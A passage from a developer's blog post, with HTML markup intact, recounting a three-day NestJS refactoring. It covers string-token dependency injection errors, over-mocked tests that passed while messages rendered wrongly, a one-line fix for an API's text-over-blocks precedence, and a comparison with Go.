@</span><span>Inject</span><span>(</span><span>'EXTERNAL_API'</span><span>) </span><span>private</span><span>externalApi</span><span>: </span><span>ApiClient</span><span>,</span></span> <span><span>private</span><span>templateEngine</span><span>: </span><span>HandlebarsService</span></span> <span><span> ) {}</span></span> <span><span>async</span><span>sendMessage</span><span>(</span><span>template</span><span>: </span><span>string</span><span>, </span><span>data</span><span>: </span><span>any</span><span>) {</span></span> <span><span>const</span><span>processed</span><span> = </span><span>this</span><span>.</span><span>templateEngine</span><span>.</span><span>process</span><span>(</span><span>template</span><span>, </span><span>data</span><span>);</span></span> <span><span>await</span><span>this</span><span>.</span><span>externalApi</span><span>.</span><span>sendMessage</span><span>({</span></span> <span><span>text:</span><span>processed</span><span>,</span></span> <span><span>blocks:</span><span>this</span><span>.</span><span>buildRichBlocks</span><span>(</span><span>data</span><span>)</span></span> <span><span> });</span></span> <span><span> }</span></span> <span><span>}</span></span></code></pre></div><p>Direct, clear, functional. But according to our enterprise architecture guidelines, it was tightly coupled. The refactored version would route everything through a gateway service:</p><div><pre><code><span><span>@</span><span>Injectable</span><span>()</span></span> <span><span>class</span><span>NotificationService</span><span> {</span></span> <span><span>constructor</span><span>(</span></span> <span><span> @</span><span>Inject</span><span>(</span><span>'GATEWAY_SERVICE'</span><span>) </span><span>private</span><span>gateway</span><span>: </span><span>ClientProxy</span></span> <span><span> ) {}</span></span> <span><span>async</span><span>sendMessage</span><span>(</span><span>messageData</span><span>: </span><span>MessagePayload</span><span>) {</span></span> <span><span>await</span><span>this</span><span>.</span><span>gateway</span><span>.</span><span>emit</span><span>(</span><span>'send_notification'</span><span>, </span><span>messageData</span><span>);</span></span> <span><span> }</span></span> <span><span>}</span></span></code></pre></div><p>Cleaner separation of concerns, centralized external integrations, more testable architecture. What could go wrong?</p><p>Everything.</p><p>When I ran <code>npm test</code>, every single one of our 45 test suites failed. The error message was a masterpiece of unhelpful verbosity:</p><div><pre><code><span><span>UnknownDependenciesException</span><span> [Error]: Nest can</span><span>'t resolve dependencies </span></span> <span><span>of the NotificationService (?, ConfigService, AmqpConnection, </span></span> <span><span>EventSqService, SqService, UserRepository). </span></span> <span><span>Please make sure that the argument "GATEWAY_SERVICE" at index [0] is </span></span> <span><span>available in the NotificationModule context.</span></span> <span><span>Potential solutions:</span></span> <span><span>- Is NotificationModule a valid NestJS module?</span></span> <span><span>- If "GATEWAY_SERVICE" is a provider, is it part of the current NotificationModule?</span></span> <span><span>- If "GATEWAY_SERVICE" is exported from a separate @Module, is that module imported within NotificationModule?</span></span></code></pre></div><p>Here&rsquo;s the fundamental problem: TypeScript cannot verify that the <code>'GATEWAY_SERVICE'</code> token actually exists, that it points to something implementing <code>ClientProxy</code>, or that your test mocks match the real implementation. You get all the ceremony of dependency injection with none of the safety guarantees.</p><p>In plain Node.js, this would be <code>const gateway = require('./gateway')</code>. If the module doesn&rsquo;t exist, you get an immediate error. In NestJS, you need to understand module imports and exports, provider registration, token-based injection, service factory functions, and circular dependency detection. The next three hours were spent in what I call &ldquo;dependency injection archaeology&rdquo;&mdash;digging through layers of module definitions to understand why NestJS couldn&rsquo;t find a service that clearly existed.</p><h3>The Token Naming Catastrophe</h3><p>The investigation revealed the root cause: inconsistent token values across files. Some used one string, others used completely different values:</p><div><pre><code><span><span>// In constants file</span></span> <span><span>export</span><span>const</span><span>GATEWAY_SERVICE</span><span> = </span><span>'GATEWAY_SERVICE'</span><span>;</span></span> <span><span>// But some modules use</span></span> <span><span>export</span><span>const</span><span>GATEWAY_SERVICE</span><span> = </span><span>'RESOURCE_MANAGER_CLIENT'</span><span>;</span></span> <span><span>// And tests use different values entirely</span></span> <span><span>export</span><span>const</span><span>GATEWAY_SERVICE</span><span> = </span><span>'MOCK_GATEWAY_SERVICE'</span><span>;</span></span> <span><span>// With inconsistent usage across files</span></span> <span><span>@</span><span>Inject</span><span>(</span><span>'GATEWAY_SERVICE'</span><span>) </span><span>// Module A</span></span> <span><span>@</span><span>Inject</span><span>(</span><span>'RESOURCE_MANAGER_CLIENT'</span><span>) </span><span>// Module B </span></span> <span><span>@</span><span>Inject</span><span>(</span><span>'MOCK_GATEWAY_SERVICE'</span><span>) </span><span>// Tests</span></span></code></pre></div><p>The real problem was that string-based dependency injection allows these mismatches to compile successfully but fail at runtime. In a language with type-based dependency injection, you&rsquo;d depend on actual interfaces rather than string tokens, eliminating this entire category of lookup errors. It took three hours to standardize token usage across fifteen files just to get dependency injection working again.</p><h3>The Template Processing Archaeology</h3><p>Removing the Handlebars dependency seemed straightforward, just replace <code>Handlebars.compile()</code> with a simple regex:</p><div><pre><code><span><span>// Replace this</span></span> <span><span>const</span><span>template</span><span> = </span><span>Handlebars</span><span>.</span><span>compile</span><span>(</span><span>message</span><span>);</span></span> <span><span>const</span><span>result</span><span> = </span><span>template</span><span>(</span><span>data</span><span>);</span></span> <span><span>// With this </span></span> <span><span>const</span><span>result</span><span> = </span><span>message</span><span>.</span><span>replace</span><span>(</span><span>/</span><span>{{</span><span>(</span><span>w</span><span>+</span><span>)</span><span>}}</span><span>/</span><span>g</span><span>, (</span><span>match</span><span>, </span><span>key</span><span>) </span><span>=&gt;</span><span>data</span><span>[</span><span>key</span><span>]);</span></span></code></pre></div><p>But our codebase had organically evolved multiple incompatible template formats. Some used <code>{{player_name}}</code>, others used <code>&lt;<player>&gt;</player></code>. Some had underscores, others spaces. What started as a simple regex replacement became a complex parsing problem:</p><div><pre><code><span><span>protected</span><span>processTemplates</span><span>(</span><span>text</span><span>: </span><span>string</span><span>, </span><span>data</span><span>: </span><span>any</span><span>): </span><span>string</span><span> {</span></span> <span><span>if</span><span> (!</span><span>text</span><span>) </span><span>return</span><span>text</span><span>;</span></span> <span><span>let</span><span>processed</span><span> = </span><span>text</span><span>;</span></span> <span><span>// Handle URL templates </span></span> <span><span>for</span><span> (</span><span>const</span><span> [</span><span>key</span><span>, </span><span>value</span><span>] </span><span>of</span><span>Object</span><span>.</span><span>entries</span><span>(</span><span>this</span><span>.</span><span>urlMappings</span><span>)) {</span></span> <span><span>const</span><span>placeholder</span><span> = </span><span>key</span><span>.</span><span>replace</span><span>(</span><span>/_/</span><span>g</span><span>, </span><span>' '</span><span>);</span></span> <span><span>const</span><span>regex</span><span> = </span><span>new</span><span>RegExp</span><span>(</span><span>`&lt;&lt;</span><span>${</span><span>placeholder</span><span>}</span><span>&gt;&gt;`</span><span>, </span><span>'gi'</span><span>);</span></span> <span><span>processed</span><span> = </span><span>processed</span><span>.</span><span>replace</span><span>(</span><span>regex</span><span>, </span><span>value</span><span>);</span></span> <span><span> }</span></span> <span><span>// Handle user mentions - but leave these for the gateway</span></span> <span><span>// Don't process &lt;<player>&gt; here</player></span></span> <span><span>return</span><span>processed</span><span>;</span></span> <span><span>}</span></span></code></pre></div><p>This problem reveals how framework complexity can obscure organizational issues. The template format inconsistency was fundamentally a process problem&mdash;lack of code review discipline and no centralized template processing strategy. But the framework&rsquo;s layered abstractions made this duplication harder to spot during development.</p><p>With template processing scattered across multiple services behind dependency injection boundaries, each individual change looked reasonable in isolation. A developer adding <code>&lt;<variable>&gt;</variable></code> syntax in one service wouldn&rsquo;t necessarily see that another service was already using <code>{{variable}}</code> syntax, especially when the processing logic was hidden behind service interfaces.</p><p>If we had used direct string manipulation without framework abstractions, the regex patterns would have been more visible in the codebase. Duplication would have been more obvious during code reviews. The processing logic would have been concentrated in fewer, more discoverable places.</p><p>The framework didn&rsquo;t create the inconsistency, but its complexity provided more places for the inconsistency to hide and grow unnoticed. Four hours of debugging time that could have been prevented with better code review practices, but was made more expensive by architectural complexity.</p><h3>The Constructor Signature Cascade</h3><p>Changing the NotificationService constructor signature broke every test that instantiated it. The mocks weren&rsquo;t just interface changes, they represented fundamentally different interaction patterns:</p><div><pre><code><span><span>// Before - every test file</span></span> <span><span>const</span><span>mockExternalApi</span><span> = {</span></span> <span><span>sendMessage:</span><span>jest</span><span>.</span><span>fn</span><span>(),</span></span> <span><span>getUserInfo:</span><span>jest</span><span>.</span><span>fn</span><span>(),</span></span> <span><span>// ... 20 more methods</span></span> <span><span>};</span></span> <span><span>const</span><span>mockTemplateEngine</span><span> = {</span></span> <span><span>compile:</span><span>jest</span><span>.</span><span>fn</span><span>(),</span></span> <span><span>process:</span><span>jest</span><span>.</span><span>fn</span><span>(),</span></span> <span><span>// ... more methods </span></span> <span><span>};</span></span> <span><span>// After - every test file</span></span> <span><span>const</span><span>mockGateway</span><span> = {</span></span> <span><span>emit:</span><span>jest</span><span>.</span><span>fn</span><span>(),</span></span> <span><span>send:</span><span>jest</span><span>.</span><span>fn</span><span>(),</span></span> <span><span>// Completely different interface</span></span> <span><span>};</span></span></code></pre></div><p>Each of the twelve test files took 45 minutes to update. We went from mocking API clients to mocking message brokers, which required completely different setup patterns. By the end of day one, all tests were passing again, but I did spent nine hours on what should have been a simple refactoring.</p><h2>Day 2: The Mock Testing Catastrophe</h2><p>The testing story reveals the deeper issue with TypeScript safety in NestJS. Comprehensive mocking requires abandoning type safety precisely where you need it most:</p><div><pre><code><span><span>const</span><span>mockGateway</span><span> = {</span></span> <span><span>emit:</span><span>jest</span><span>.</span><span>fn</span><span>(),</span></span> <span><span>send:</span><span>jest</span><span>.</span><span>fn</span><span>(),</span></span> <span><span>// Missing methods? You'll find out at runtime</span></span> <span><span>// Wrong signatures? any defeats checking</span></span> <span><span>} </span><span>as</span><span>any</span><span>; </span><span>// White flag of surrender to type safety</span></span></code></pre></div><p>That <code>as any</code> isn&rsquo;t a bug&mdash;it&rsquo;s the only way to make NestJS mocking work efficiently. You&rsquo;re telling TypeScript &ldquo;I don&rsquo;t care about types&rdquo; in your tests, which defeats the entire purpose of using TypeScript in the first place.</p><p>The elaborate test setup required for NestJS shows how far we&rsquo;ve strayed from simple, verifiable code:</p><div><pre><code><span><span>describe</span><span>(</span><span>'NotificationService'</span><span>, () </span><span>=&gt;</span><span> {</span></span> <span><span>beforeEach</span><span>(</span><span>async</span><span> () </span><span>=&gt;</span><span> {</span></span> <span><span>const</span><span>module</span><span> = </span><span>await</span><span>Test</span><span>.</span><span>createTestingModule</span><span>({</span></span> <span><span>providers:</span><span> [</span></span> <span><span>NotificationService</span><span>,</span></span> <span><span> {</span></span> <span><span>provide:</span><span>'GATEWAY_SERVICE'</span><span>,</span></span> <span><span>useValue:</span><span>mockGateway</span><span>,</span></span> <span><span> },</span></span> <span><span> {</span></span> <span><span>provide:</span><span>ConfigService</span><span>,</span></span> <span><span>useValue:</span><span>mockConfigService</span><span>, </span></span> <span><span> },</span></span> <span><span> {</span></span> <span><span>provide:</span><span>AmqpConnection</span><span>,</span></span> <span><span>useValue:</span><span>mockAmqpConnection</span><span>,</span></span> <span><span> },</span></span> <span><span> {</span></span> <span><span>provide:</span><span>EventSequenceService</span><span>,</span></span> <span><span>useValue:</span><span>mockEventSequenceService</span><span>,</span></span> <span><span> },</span></span> <span><span> {</span></span> <span><span>provide:</span><span>SequenceHandlerService</span><span>, </span></span> <span><span>useValue:</span><span>mockSequenceHandlerService</span><span>,</span></span> <span><span> },</span></span> <span><span> {</span></span> <span><span>provide:</span><span>getRepositoryToken</span><span>(</span><span>PlayerSession</span><span>),</span></span> <span><span>useValue:</span><span>mockRepository</span><span>,</span></span> <span><span> },</span></span> <span><span>// ... 10 more mock services</span></span> <span><span> ],</span></span> <span><span> }).</span><span>compile</span><span>();</span></span> <span><span> });</span></span> <span><span>});</span></span></code></pre></div><p>More time spent setting up mocks than writing actual tests. Mocks drift from real implementations. Complex dependency chains require understanding the entire service graph. Test failures often mean mock setup issues, not actual bugs.</p><p>After fixing all the dependency injection issues and achieving perfect test coverage, I deployed to dev. The tests were green, coverage was high, and the code looked clean. Then we tested the actual feature.</p><p>Expected: Rich interactive message with welcome text and action buttons Actual: Plain text saying &ldquo;Start session 27&rdquo;</p><h2>Day 2: When 93% Coverage Meets 0% Functionality</h2><p>This is the nightmare scenario of modern testing: comprehensive mocks validating that your abstractions work as designed, while your actual feature is completely broken. We had tests verifying that <code>gateway.emit</code> was called with the right parameters, but no tests checking whether messages actually rendered correctly:</p><div><pre><code><span><span>// Test passes</span></span> <span><span>it</span><span>(</span><span>'should send message'</span><span>, </span><span>async</span><span> () </span><span>=&gt;</span><span> {</span></span> <span><span>await</span><span>service</span><span>.</span><span>sendMessage</span><span>(</span><span>mockMessage</span><span>);</span></span> <span><span>expect</span><span>(</span><span>gateway</span><span>.</span><span>emit</span><span>).</span><span>toHaveBeenCalledWith</span><span>(</span><span>'send_notification'</span><span>, </span><span>mockMessage</span><span>);</span></span> <span><span>});</span></span> <span><span>// Real world fails</span></span> <span><span>// External API shows text instead of rich blocks</span></span></code></pre></div><p>The investigation began. Where was the problem? The notification service building messages? The gateway service forwarding them? The external API integration? The external service itself?</p><p>I started tracing through the logs. The notification service was processing notifications correctly:</p><div><pre><code><span><span>{</span></span> <span><span>"level"</span><span>: </span><span>"debug"</span><span>,</span></span> <span><span>"msg"</span><span>: </span><span>"Processing notification"</span><span>,</span></span> <span><span>"payload"</span><span>: {</span></span> <span><span>"template"</span><span>: </span><span>"Welcome to {{scenario_name}}..."</span><span>,</span></span> <span><span>"data"</span><span>: {</span><span>"scenario_name"</span><span>: </span><span>"First Day"</span><span>, </span><span>"player"</span><span>: </span><span>"John"</span><span>}</span></span> <span><span> }</span></span> <span><span>}</span></span></code></pre></div><p>The gateway service was receiving send_notification events with perfect payload structures:</p><div><pre><code><span><span>{</span></span> <span><span>"level"</span><span>: </span><span>"debug"</span><span>, </span></span> <span><span>"msg"</span><span>: </span><span>"Received send_notification event"</span><span>,</span></span> <span><span>"payload"</span><span>: {</span></span> <span><span>"channel"</span><span>: </span><span>"test-channel-123"</span><span>,</span></span> <span><span>"text"</span><span>: </span><span>"Start session 27"</span><span>,</span></span> <span><span>"blocks"</span><span>: [</span></span> <span><span> {</span></span> <span><span>"type"</span><span>: </span><span>"section"</span><span>,</span></span> <span><span>"text"</span><span>: {</span></span> <span><span>"type"</span><span>: </span><span>"mrkdwn"</span><span>,</span></span> <span><span>"text"</span><span>: </span><span>"Welcome to First Day, it is time to meet the team..."</span></span> <span><span> }</span></span> <span><span> },</span></span> <span><span> {</span></span> <span><span>"type"</span><span>: </span><span>"actions"</span><span>, </span></span> <span><span>"elements"</span><span>: [</span></span> <span><span> {</span></span> <span><span>"type"</span><span>: </span><span>"button"</span><span>,</span></span> <span><span>"text"</span><span>: {</span><span>"type"</span><span>: </span><span>"plain_text"</span><span>, </span><span>"text"</span><span>: </span><span>"Start"</span><span>},</span></span> <span><span>"action_id"</span><span>: </span><span>"START_LEVEL"</span></span> <span><span> }</span></span> <span><span> ]</span></span> <span><span> }</span></span> <span><span> ]</span></span> <span><span> }</span></span> <span><span>}</span></span></code></pre></div><p>The external API was receiving the data correctly and responding successfully:</p><div><pre><code><span><span>{</span></span> <span><span>"level"</span><span>: </span><span>"debug"</span><span>,</span></span> <span><span>"msg"</span><span>: </span><span>"Sending message"</span><span>,</span></span> <span><span>"request"</span><span>: {</span></span> <span><span>"channel"</span><span>: </span><span>"test-channel-123"</span><span>, </span></span> <span><span>"text"</span><span>: </span><span>"Start session 27"</span><span>,</span></span> <span><span>"blocks"</span><span>: [</span><span>/* same blocks as above */</span><span>]</span></span> <span><span> },</span></span> <span><span>"response"</span><span>: {</span></span> <span><span>"ok"</span><span>: </span><span>true</span><span>,</span></span> <span><span>"channel"</span><span>: </span><span>"C1234567890"</span><span>, </span></span> <span><span>"ts"</span><span>: </span><span>"1234567890.123456"</span></span> <span><span> }</span></span> <span><span>}</span></span></code></pre></div><p>Every layer was working correctly in isolation, but the end result was wrong. This was maddening. I spent the next six hours investigating whether our template processing was corrupting the JSON, checking character encoding, validating block syntax, and testing message size limits. Everything looked correct.</p><h3>The Framework Wild Goose Chase</h3><p>The framework&rsquo;s abstractions led me down multiple dead ends. Initial theories included:</p><ol> <li>&ldquo;The session service isn&rsquo;t building blocks correctly&rdquo;</li> <li>&ldquo;The gateway service isn&rsquo;t forwarding blocks properly&rdquo;</li> <li>&ldquo;There&rsquo;s a serialization issue between services&rdquo;</li> <li>&ldquo;The template processing is corrupting the JSON structure&rdquo;</li> </ol><p>I spent hours debugging the wrong layers entirely, tracing through framework internals instead of questioning external assumptions. The sophistication of the abstractions made it feel like the problem must be in our code, not in something as simple as API field precedence.</p><h2>Day 3: The One-Line Revelation</h2><p>Starting day three, I decided to stop assuming the problem was in our code and start questioning external assumptions. Maybe the external API was working correctly, and the problem was in how it prioritizes different message fields.</p><p>I dove deep into the external API documentation and found this buried section:</p><blockquote><p><strong>The text, blocks and attachments fields</strong></p><p>The usage of the text field changes depending on whether you&rsquo;re using blocks. If you&rsquo;re using blocks, this is used as a fallback string to display in notifications. If you aren&rsquo;t, this is the main body text of the message.</p><p><strong>When both text and blocks are present, the text field takes precedence as the main message content.</strong></p></blockquote><p>There it was. The smoking gun. The reason 24 hours of debugging had yielded nothing.</p><p>When both <code>text</code> and <code>blocks</code> fields are present, the external API uses <code>text</code> as the primary content and treats <code>blocks</code> as secondary. We were sending both fields, so the API was showing our fallback text instead of our rich blocks.</p><p>The fix was embarrassingly simple:</p><div><pre><code><span><span>// Before (broken)</span></span> <span><span>const message = {</span></span> <span><span>channel</span><span>: </span><span>data.channel</span><span>,</span></span> <span><span>text</span><span>: </span><span>processedText</span><span>, </span><span>// API prioritizes this</span></span> <span><span>blocks</span><span>: </span><span>richBlocks</span><span>// Over this</span></span> <span><span>};</span></span> <span><span>// After (working)</span></span> <span><span>const messageText = data.blocks ? '' : processedText;</span></span> <span><span>const message = {</span></span> <span><span>channel</span><span>: </span><span>data.channel</span><span>, </span></span> <span><span>text</span><span>: </span><span>messageText</span><span>, </span><span>// Empty when blocks present</span></span> <span><span>blocks</span><span>: </span><span>richBlocks</span></span> <span><span>};</span></span></code></pre></div><p>One line of logic. After 24+ hours of debugging across multiple services, extensive logging, JSON corruption theories, template processing investigations, and dependency injection archaeology.</p><h3>The Testing Aftermath</h3><p>Of course, the one-line fix broke several existing tests that expected different behavior:</p><div><pre><code><span><span>// This test was now wrong</span></span> <span><span>expect(apiClient.sendMessage).toHaveBeenCalledWith({</span></span> <span><span>text</span><span>: </span><span>'Expected</span><span>text'</span><span>, </span><span>// Now expects empty string</span></span> <span><span>blocks</span><span>: </span><span>expectedBlocks</span></span> <span><span>});</span></span> <span><span>// Had to become this</span></span> <span><span>expect(apiClient.sendMessage).toHaveBeenCalledWith({</span></span> <span><span>text</span><span>: </span><span>''</span><span>, </span><span>// Empty when blocks present</span></span> <span><span>blocks</span><span>: </span><span>expectedBlocks</span></span> <span><span>});</span></span></code></pre></div><p>Required updating four test files and adding three new test cases to cover the text/blocks interaction logic. Two more hours updating tests for a one-line code change.</p><h2>The Fundamental Type Safety Problem</h2><p>This experience crystallized a fundamental insight about TypeScript and dependency injection frameworks. Compare the debugging experience to what the same refactoring might look like in Go:</p><div><pre><code><span><span>type</span><span>NotificationService</span><span>struct</span><span> {</span></span> <span><span> gateway GatewayClient </span><span>// Interface verified at compile time</span></span> <span><span>}</span></span> <span><span>func</span><span>NewNotificationService</span><span>(gateway GatewayClient) *NotificationService {</span></span> <span><span>return</span><span> &amp;NotificationService{gateway: gateway}</span></span> <span><span>}</span></span> <span><span>func</span><span> (s *NotificationService) </span><span>SendMessage</span><span>(msg MessagePayload) </span><span>error</span><span> {</span></span> <span><span>return</span><span> s.gateway.</span><span>Send</span><span>(</span><span>"send_notification"</span><span>, msg)</span></span> <span><span>}</span></span></code></pre></div><p>If <code>gateway</code> doesn&rsquo;t implement <code>GatewayClient</code>, the code won&rsquo;t compile. No tokens, no runtime injection failures, no module archaeology. The dependencies are explicit in the constructor signature.</p><p>Testing becomes straightforward:</p><div><pre><code><span><span>type</span><span>MockGateway</span><span>struct</span><span> {</span></span> <span><span> LastEvent </span><span>string</span></span> <span><span> LastPayload MessagePayload</span></span> <span><span>}</span></span> <span><span>func</span><span> (m *MockGateway) </span><span>Send</span><span>(event </span><span>string</span><span>, payload MessagePayload) </span><span>error</span><span> {</span></span> <span><span>m.LastEvent</span><span> = event</span></span> <span><span>m.LastPayload</span><span> = payload</span></span> <span><span>return</span><span>nil</span></span> <span><span>}</span></span> <span><span>func</span><span>TestSendMessage</span><span>(t *testing.T) {</span></span> <span><span>mockGateway</span><span> := &amp;MockGateway{}</span></span> <span><span>service</span><span> := </span><span>NewNotificationService</span><span>(mockGateway)</span></span> <span><span>err</span><span> := service.</span><span>SendMessage</span><span>(testMessage)</span></span> <span><span> assert.</span><span>NoError</span><span>(t, err)</span></span> <span><span> assert.</span><span>Equal</span><span>(t, </span><span>"send_notification"</span><span>, mockGateway.LastEvent)</span></span> <span><span> assert.</span><span>Equal</span><span>(t, testMessage, mockGateway.LastPayload)</span></span> <span><span>}</span></span></code></pre></div><p>If <code>MockGateway</code> doesn&rsquo;t correctly implement <code>GatewayClient</code>, it won&rsquo;t compile. The compiler enforces that mocks match interfaces without escape hatches. No <code>as any</code>, no token mismatches, no runtime surprises.</p><h2>Where TypeScript&rsquo;s Promise Breaks Down</h2><p>TypeScript promises type safety, but NestJS patterns systematically undermine it:</p><ul> <li><code>@Inject()</code> tokens bypass type checking entirely</li> <li><code>any</code> types in test mocks disable verification where it matters most</li> <li>Reflection-based decorators hide runtime behavior from static analysis</li> <li>Module resolution happens at runtime, not compile time</li> <li>Complex dependency graphs obscure simple integration failures</li> </ul><p>You end up with TypeScript&rsquo;s complexity overhead without its safety benefits. The type system becomes theater, present for developer confidence but absent when you actually need protection.</p><h3>The Architecture Mismatch</h3><p>The deeper issue was architectural: we chose enterprise patterns before we had enterprise problems. A 6-person team building a straightforward notification service doesn&rsquo;t need sophisticated dependency injection, modular architecture, or decorator-driven development.</p><p>We optimized for coordination problems we didn&rsquo;t have while creating debugging problems we did have. The &ldquo;enterprise ready&rdquo; patterns became obstacles to shipping working software.</p><p>The refactoring story reveals the hidden costs of sophisticated frameworks:</p><ul> <li><strong>Development Time:</strong> 3 days instead of planned 1 day</li> <li><strong>Debugging Time:</strong> 24+ hours for a one-line fix</li> <li><strong>Test Maintenance:</strong> Updates across 16 test files</li> <li><strong>System Complexity:</strong> Simple direct calls became multi-service orchestration</li> <li><strong>Knowledge Requirements:</strong> Team needs to understand dependency injection, module systems, message patterns, cross-service debugging</li> </ul> <h2>The Backend Development Reality Check</h2><p>Backend services have specific requirements that expose these weaknesses:</p><p><strong>Runtime Failures Are Expensive:</strong> A dependency injection failure can bring down production services. Compile-time verification prevents entire categories of deployment issues that no amount of testing can catch reliably.</p><p><strong>Debugging at 3 AM:</strong> When services fail in production, you need stack traces pointing to actual code, not framework internals. Six developers tracing through dependency injection chains is waste.</p><p><strong>Performance Under Load:</strong> Reflection overhead and dynamic resolution costs accumulate in high-throughput services. Direct function calls have predictable performance characteristics.</p><p><strong>Team Coordination:</strong> The complexity should be in business logic, not in framework mechanics. Understanding your domain is hard enough without also needing to understand framework archaeology.</p><h2>The Language Choice Implications</h2><p>This experience revealed a fundamental tension in backend development: flexibility versus safety. JavaScript and TypeScript optimize for rapid prototyping and developer expressiveness. Strictly typed languages optimize for correctness and long-term maintenance.</p><p>For backend services where bugs have real business impact, correctness often matters more than expressiveness. The ability to ship fast doesn&rsquo;t matter if what you ship doesn&rsquo;t work reliably.</p><p>Go&rsquo;s approach&mdash;explicit dependencies, compile-time verification, simple patterns&mdash;aligns better with backend development requirements. You sacrifice some expressiveness for much stronger guarantees about correctness.</p><p>Consider how the same service structure looks in Go:</p><div><pre><code><span><span>type</span><span>NotificationService</span><span>struct</span><span> {</span></span> <span><span> httpClient *http.Client</span></span> <span><span> config *Config</span></span> <span><span> logger *slog.Logger</span></span> <span><span>}</span></span> <span><span>func</span><span> (s *NotificationService) </span><span>SendMessage</span><span>(ctx context.Context, msg Message) </span><span>error</span><span> {</span></span> <span><span>payload</span><span>, </span><span>err</span><span> := json.</span><span>Marshal</span><span>(msg)</span></span> <span><span>if</span><span> err != </span><span>nil</span><span> {</span></span> <span><span>return</span><span> fmt.</span><span>Errorf</span><span>(</span><span>"failed to marshal message: </span><span>%w</span><span>"</span><span>, err)</span></span> <span><span> }</span></span> <span><span>req</span><span>, </span><span>err</span><span> := http.</span><span>NewRequestWithContext</span><span>(ctx, </span><span>"POST"</span><span>, s.config.GatewayURL, bytes.</span><span>NewReader</span><span>(payload))</span></span> <span><span>if</span><span> err != </span><span>nil</span><span> {</span></span> <span><span>return</span><span> fmt.</span><span>Errorf</span><span>(</span><span>"failed to create request: </span><span>%w</span><span>"</span><span>, err)</span></span> <span><span> }</span></span> <span><span>resp</span><span>, </span><span>err</span><span> := s.httpClient.</span><span>Do</span><span>(req)</span></span> <span><span>if</span><span> err != </span><span>nil</span><span> {</span></span> <span><span>return</span><span> fmt.</span><span>Errorf</span><span>(</span><span>"failed to send request: </span><span>%w</span><span>"</span><span>, err)</span></span> <span><span> }</span></span> <span><span>defer</span><span> resp.Body.</span><span>Close</span><span>()</span></span> <span><span>if</span><span> resp.StatusCode != http.StatusOK {</span></span> <span><span>return</span><span> fmt.</span><span>Errorf</span><span>(</span><span>"gateway returned error: </span><span>%d</span><span>"</span><span>, resp.StatusCode)</span></span> <span><span> }</span></span> <span><span>return</span><span>nil</span></span> <span><span>}</span></span></code></pre></div><p>No dependency injection framework. No complex module system. No token-based provider registration. No extensive mock configurations. Stack traces point to actual code. External API behavior is immediately obvious. Dependencies are explicit and compile-time verified.</p><p>Testing requires no framework magic:</p><div><pre><code><span><span>func</span><span>TestNotificationService_SendMessage</span><span>(t *testing.T) {</span></span> <span><span>server</span><span> := httptest.</span><span>NewServer</span><span>(http.</span><span>HandlerFunc</span><span>(</span><span>func</span><span>(w http.ResponseWriter, r *http.Request) {</span></span> <span><span> assert.</span><span>Equal</span><span>(t, </span><span>"POST"</span><span>, r.Method)</span></span> <span><span> assert.</span><span>Equal</span><span>(t, </span><span>"application/json"</span><span>, r.Header.</span><span>Get</span><span>(</span><span>"Content-Type"</span><span>))</span></span> <span><span>var</span><span>msg</span><span> Message</span></span> <span><span>err</span><span> := json.</span><span>NewDecoder</span><span>(r.Body).</span><span>Decode</span><span>(&amp;msg)</span></span> <span><span> assert.</span><span>NoError</span><span>(t, err)</span></span> <span><span> assert.</span><span>Equal</span><span>(t, </span><span>"test message"</span><span>, msg.Text)</span></span> <span><span> w.</span><span>WriteHeader</span><span>(http.StatusOK)</span></span> <span><span> }))</span></span> <span><span>defer</span><span> server.</span><span>Close</span><span>()</span></span> <span><span>config</span><span> := &amp;Config{GatewayURL: server.URL}</span></span> <span><span>service</span><span> := &amp;NotificationService{</span></span> <span><span> httpClient: http.DefaultClient,</span></span> <span><span> config: config,</span></span> <span><span> logger: slog.</span><span>Default</span><span>(),</span></span> <span><span> }</span></span> <span><span>err</span><span> := service.</span><span>SendMessage</span><span>(context.</span><span>Background</span><span>(), Message{Text: </span><span>"test message"</span><span>})</span></span> <span><span> assert.</span><span>NoError</span><span>(t, err)</span></span> <span><span>}</span></span></code></pre></div><p>No mocks needed&mdash;just spin up a test server and verify the actual HTTP behavior. The test validates that the service correctly constructs requests and handles responses, not that it calls mocked methods with expected parameters.</p><h2>The Hidden Costs of Sophisticated Frameworks</h2><p>NestJS provides genuine value for large teams building complex systems. The modular architecture, built-in patterns, and comprehensive ecosystem solve real coordination problems. But that value comes with costs that aren&rsquo;t obvious until you pay them:</p><p><strong>Cognitive Overhead:</strong> Understanding framework mechanics instead of business logic. Every team member needs to understand dependency injection, module systems, decorator patterns, and testing frameworks.</p><p><strong>Debugging Complexity:</strong> Multiple abstraction layers obscuring simple problems. When something breaks, you debug through framework internals instead of your actual code.</p><p><strong>Testing Theater:</strong> High coverage masking low effectiveness. Extensive mocking validates that your abstractions work as designed, not that your business logic produces correct outcomes.</p><p><strong>Runtime Surprises:</strong> Type system failures in production. Token mismatches, circular dependencies, and configuration errors that compile successfully but fail at runtime.</p><p>For teams building straightforward services, these costs often exceed the benefits. The framework optimizes for problems you don&rsquo;t have while creating problems you can&rsquo;t solve efficiently.</p><h2>When Enterprise Patterns Actually Pay Off</h2><p>The refactoring was ultimately successful despite the pain. The new architecture is more maintainable, more testable, and better separated. The centralized gateway service makes it easier to add new external integrations and handle failures consistently.</p><p>But this only pays off because we&rsquo;re building a system with multiple external integrations, team coordination requirements, and long-term maintenance needs. The complexity tax becomes worthwhile when the problems justify the tools.</p><p>NestJS makes sense when you have:</p><ul> <li><strong>Large teams (15+ developers)</strong> needing enforced consistency across multiple services</li> <li><strong>Complex domains</strong> requiring extensive validation, authorization, and business rule coordination</li> <li><strong>Long-term maintenance</strong> where modular architecture benefits outweigh development velocity costs</li> <li><strong>Enterprise requirements</strong> for observability, compliance, and operational consistency</li> </ul><p>Simpler approaches make sense when you have:</p><ul> <li><strong>Small teams (2-10 developers)</strong> prioritizing rapid iteration and fast feedback loops</li> <li><strong>Straightforward domains</strong> where business logic complexity doesn&rsquo;t require framework abstractions</li> <li><strong>Performance requirements</strong> where framework overhead impacts user experience</li> <li><strong>Experienced developers</strong> who can maintain consistency without framework enforcement</li> </ul> <h2>The Architectural Choice Framework</h2><p>The key insight from this experience is that architectural decisions should optimize for current requirements while remaining flexible enough to evolve, not for hypothetical future problems that may never materialize.</p><p>Instead of asking &ldquo;What&rsquo;s the most sophisticated solution?&rdquo; or &ldquo;What would Netflix use?&rdquo;, ask:</p><ol> <li><strong>What problems do we actually have today?</strong> &ndash; Don&rsquo;t solve coordination problems you don&rsquo;t have</li> <li><strong>Can we solve this more simply?</strong> &ndash; Prefer solutions that match problem complexity</li> <li><strong>What are the real failure modes?</strong> &ndash; Optimize for problems that actually hurt your users</li> <li><strong>How will this affect debugging?</strong> 